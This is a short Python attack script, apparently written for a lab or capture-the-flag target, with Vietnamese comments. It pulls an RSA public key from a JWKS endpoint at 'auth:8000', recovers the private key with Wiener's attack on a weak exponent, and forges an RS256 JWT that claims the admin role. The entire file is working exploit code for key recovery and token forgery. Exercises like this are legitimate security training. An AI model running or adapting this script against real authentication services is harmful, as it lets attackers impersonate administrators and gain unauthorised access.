#!/usr/bin/env python3
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from wiener_attack import get_rsa_from_jwks, wiener_attack
from cryptography.hazmat.backends import default_backend
import time 

JWKS_URL = "http://auth:8000/.well-known/jwks.json"

# 1. Lấy n, e
n, e = get_rsa_from_jwks(JWKS_URL)

# 2. Wiener attack
print("[+] Running Wiener attack...")
p, q, d = wiener_attack(e, n)
if not d:
    print("[-] Attack failed")
    exit(1)

print("[+] Private exponent recovered!")

# 3. Rebuild RSA private key

private_numbers = rsa.RSAPrivateNumbers(
    p=p,
    q=q,
    d=d,
    dmp1=d % (p - 1),
    dmq1=d % (q - 1),
    iqmp=pow(q, -1, p),
    public_numbers=rsa.RSAPublicNumbers(e, n)
)

private_key = private_numbers.private_key(default_backend())


# 4. Serialize sang PEM (CỰC KỲ QUAN TRỌNG)
pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

# 5. Forge JWT

payload = {
    "sub": "admin",
    "role": "admin",
    "iss": "auth-service",
    "aud": "api-gateway",
    "exp": int(time.time()) + 3600
}

token = jwt.encode(
    payload,
    pem,
    algorithm="RS256",
    headers={"kid": "weak-key"}
)

print("\n[+] Forged JWT:")
print(token)
